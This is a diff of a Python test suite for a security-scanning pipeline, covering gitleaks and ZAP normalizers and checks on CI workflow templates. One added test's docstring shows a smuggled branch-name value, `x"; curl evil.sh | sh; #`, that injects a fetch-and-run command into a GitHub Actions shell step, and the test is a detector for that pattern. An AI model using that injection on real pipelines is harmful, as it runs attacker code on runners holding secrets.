@@ -68,26 +68,20 @@ def gitleaks_record(**overrides: Any) -> dict[str, Any]:
 
 class TestGitleaks:
     def test_a_finding_is_produced(self) -> None:
-        result = gitleaks_normalize(
-            json.dumps([gitleaks_record()]).encode(), context("secrets")
-        )
+        result = gitleaks_normalize(json.dumps([gitleaks_record()]).encode(), context("secrets"))
         assert len(result.findings) == 1
         assert result.findings[0].file_path == "config/settings.py"
 
     def test_severity_is_always_critical(self) -> None:
         """Gitleaks does not rank findings. A committed live credential is
         critical whichever pattern caught it."""
-        result = gitleaks_normalize(
-            json.dumps([gitleaks_record()]).encode(), context("secrets")
-        )
+        result = gitleaks_normalize(json.dumps([gitleaks_record()]).encode(), context("secrets"))
         assert result.findings[0].severity is Severity.CRITICAL
 
     def test_no_snippet_is_ever_captured(self) -> None:
         """Every other adapter captures surrounding source for fingerprint
         stability. Doing that here would copy the secret into the lake."""
-        result = gitleaks_normalize(
-            json.dumps([gitleaks_record()]).encode(), context("secrets")
-        )
+        result = gitleaks_normalize(json.dumps([gitleaks_record()]).encode(), context("secrets"))
         assert result.findings[0].code_snippet == REDACTED
 
     def test_the_finding_says_which_commit_it_is_about(self) -> None:
@@ -113,9 +107,7 @@ class TestGitleaks:
     def test_it_leads_with_rotation_not_deletion(self) -> None:
         """Deleting the line is the intuitive fix and the useless one: the
         value is already in every clone that fetched it."""
-        result = gitleaks_normalize(
-            json.dumps([gitleaks_record()]).encode(), context("secrets")
-        )
+        result = gitleaks_normalize(json.dumps([gitleaks_record()]).encode(), context("secrets"))
 
         assert "rotate" in result.findings[0].description.lower()
 
@@ -191,9 +183,7 @@ class TestGitleaks:
 
     def test_the_description_says_to_rotate(self) -> None:
         """Deleting the line does not un-leak it — the value is in git history."""
-        result = gitleaks_normalize(
-            json.dumps([gitleaks_record()]).encode(), context("secrets")
-        )
+        result = gitleaks_normalize(json.dumps([gitleaks_record()]).encode(), context("secrets"))
         assert "rotate" in result.findings[0].description.lower()
         assert "history" in result.findings[0].description.lower()
 
@@ -222,12 +212,14 @@ def zap_report(instances: list[dict[str, str]] | None = None, **alert: Any) -> b
 
 class TestZap:
     def test_riskcode_maps_to_severity(self) -> None:
-        assert zap_normalize(zap_report(riskcode="3"), context("dast")).findings[
-            0
-        ].severity is Severity.HIGH
-        assert zap_normalize(zap_report(riskcode="0"), context("dast")).findings[
-            0
-        ].severity is Severity.INFO
+        assert (
+            zap_normalize(zap_report(riskcode="3"), context("dast")).findings[0].severity
+            is Severity.HIGH
+        )
+        assert (
+            zap_normalize(zap_report(riskcode="0"), context("dast")).findings[0].severity
+            is Severity.INFO
+        )
 
     def test_the_url_path_is_the_location(self) -> None:
         finding = zap_normalize(zap_report(), context("dast")).findings[0]
@@ -272,9 +264,7 @@ class TestZap:
 
     def test_runaway_instance_counts_are_capped_and_reported(self) -> None:
         """Silent truncation would read as "that is all of them"."""
-        instances = [
-            {"uri": f"https://x.test/page/{i}", "method": "GET"} for i in range(60)
-        ]
+        instances = [{"uri": f"https://x.test/page/{i}", "method": "GET"} for i in range(60)]
         result = zap_normalize(zap_report(instances=instances), context("dast"))
 
         assert len(result.findings) == MAX_INSTANCES_PER_ALERT
@@ -443,8 +433,7 @@ class TestRegistry:
             if "actions/upload-results@" not in rendered:
                 continue
             assert re.search(r"^\s*mykronos-ref:\s*v9\s*$", rendered, re.MULTILINE), (
-                f"{capability} calls the upload action without passing the ref "
-                "it was rendered with"
+                f"{capability} calls the upload action without passing the ref it was rendered with"
             )
 
     def test_no_template_contains_the_jinja_comment_collision(self) -> None:
@@ -467,6 +456,50 @@ class TestRegistry:
         assert offenders == [], (
             f"{offenders} use bash array-length syntax, which Jinja reads as "
             "an unterminated comment. Count lines in a file instead."
+        )
+
+    def test_no_run_step_interpolates_attacker_controlled_context(self) -> None:
+        """`${{ }}` in a `run:` body is substituted before bash parses it.
+
+        A pull request from a fork chooses its own branch name, so
+        `github.head_ref` of `x"; curl evil.sh | sh; #` becomes a command on
+        the runner - one holding this job's ingestion token. Semgrep found
+        exactly this in the composite action, at high severity, on the first
+        run of the SAST lane through Concourse.
+
+        The fix is to bind values to `env:` and reference "$VAR", so bash
+        receives them as data. This checks the property rather than the fix,
+        because the next person adding a flag will reach for interpolation.
+        """
+        import re
+        from pathlib import Path
+
+        from mykronos.config import get_settings
+
+        risky = re.compile(r"\$\{\{\s*(github\.(head_ref|ref_name|event\.)|inputs\.)")
+        root = Path(get_settings().workflow_templates_dir).parent
+        files = [root / "actions" / "upload-results" / "action.yml"]
+        files += sorted(get_settings().workflow_templates_dir.glob("*.j2"))
+
+        offenders = []
+        for path in files:
+            if not path.exists():
+                continue
+            in_run = False
+            for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
+                stripped = line.strip()
+                if stripped.startswith("run:"):
+                    in_run = True
+                    indent = len(line) - len(line.lstrip())
+                    continue
+                if in_run and stripped and not line.startswith(" " * (indent + 1)):
+                    in_run = False
+                if in_run and risky.search(line):
+                    offenders.append(f"{path.name}:{number}")
+
+        assert offenders == [], (
+            f"{offenders} interpolate caller-controlled context into a shell "
+            'script. Bind them to env: and use "$VAR" instead.'
         )
 
     def test_the_injected_upload_action_ref_is_a_commit_sha(self) -> None:
@@ -530,16 +563,14 @@ class TestRegistry:
         )
 
         install = next(
-            step
-            for step in spec["runs"]["steps"]
-            if "pip install" in str(step.get("run", ""))
+            step for step in spec["runs"]["steps"] if "pip install" in str(step.get("run", ""))
         )
         assert "github.action_ref" in str(install.get("env", {})), (
             "the install step must resolve its ref from github.action_ref"
         )
 
     def test_no_package_sources_is_an_empty_scan_not_a_failed_one(self) -> None:
-        """"Nothing to scan" and "the scan broke" must not be the same state.
+        """ "Nothing to scan" and "the scan broke" must not be the same state.
 
         osv-scanner exits 128 with "No package sources found" when a repository
         declares no dependencies -- a docs repo, a shell-script repo, a
@@ -560,9 +591,9 @@ class TestRegistry:
         """
         from mykronos.config import get_settings
 
-        template = (
-            get_settings().workflow_templates_dir / "atlas.yml.j2"
-        ).read_text(encoding="utf-8")
+        template = (get_settings().workflow_templates_dir / "atlas.yml.j2").read_text(
+            encoding="utf-8"
+        )
 
         scan = template[template.index("run_osv()") :]
         scan = scan[: scan.index("Generate the SBOM")]
@@ -573,9 +604,7 @@ class TestRegistry:
             "the empty-repository case is not detected; a repo with no manifests "
             "will fail its supply-chain lane forever"
         )
-        assert re.search(r'rc"?\s*-eq\s*128', scan), (
-            "exit 128 is no longer special-cased"
-        )
+        assert re.search(r'rc"?\s*-eq\s*128', scan), "exit 128 is no longer special-cased"
 
         # The escape hatch must not swallow real failures.
         assert re.search(r'rc"?\s*-gt\s*1', scan), (
@@ -630,9 +659,9 @@ class TestRegistry:
         """
         from mykronos.config import get_settings
 
-        template = (
-            get_settings().workflow_templates_dir / "atlas.yml.j2"
-        ).read_text(encoding="utf-8")
+        template = (get_settings().workflow_templates_dir / "atlas.yml.j2").read_text(
+            encoding="utf-8"
+        )
 
         # An SBOM is evidence. Evidence produced by an unknown version of the
         # tool is worth less than none, so `latest` is not acceptable here.
@@ -671,6 +700,7 @@ class TestRegistry:
             "the zero-component guard is gone -- an empty SBOM would be archived "
             "and would read as evidence."
         )
+
     def test_templates_send_every_required_query_param_to_ingest_raw(self) -> None:
         """The Archive step hand-rolls a curl the uploader builds properly.
 
@@ -694,8 +724,7 @@ class TestRegistry:
         required = {
             name
             for name, param in inspect.signature(ingest_raw_output).parameters.items()
-            if param.default is inspect.Parameter.empty
-            and name not in {"request", "token"}
+            if param.default is inspect.Parameter.empty and name not in {"request", "token"}
         }
         assert required, "could not read the endpoint's required params"
 
@@ -754,9 +783,7 @@ class TestRegistry:
 
         unpinned = []
         for path in sources:
-            for lineno, line in enumerate(
-                path.read_text(encoding="utf-8").splitlines(), start=1
-            ):
+            for lineno, line in enumerate(path.read_text(encoding="utf-8").splitlines(), start=1):
                 # Anchored: `uses:` as a YAML key, not the word "uses:"
                 # inside a prose comment (both files have one).
                 match = re.match(r"\s*-?\s*uses:\s*(\S+)\s*(?:#.*)?$", line)
@@ -878,9 +905,7 @@ class TestRegistry:
     def test_a_missing_results_directory_is_a_failure(self, tmp_path: Path) -> None:
         """spec 04 §6: a permanently broken scanner must not look like a
         permanently clean repo."""
-        outcome = normalize_results(
-            "secrets", "gitleaks", tmp_path / "nope", context("secrets")
-        )
+        outcome = normalize_results("secrets", "gitleaks", tmp_path / "nope", context("secrets"))
         assert outcome.scan_status is ScanStatus.FAILURE
 
     def test_the_tool_pattern_selects_the_right_files(self, tmp_path: Path) -> None:
@@ -943,9 +968,7 @@ class TestTemplatesMatchTheCliTheyCall:
 
         checked = 0
         for source in sources:
-            for module_name in set(
-                _re.findall(r"python -m (mykronos\.[a-z_]+)", source)
-            ):
+            for module_name in set(_re.findall(r"python -m (mykronos\.[a-z_]+)", source)):
                 module = importlib.import_module(module_name)
                 # The flags the module accepts, read off its own parser.
                 accepted = _accepted_flags(module)
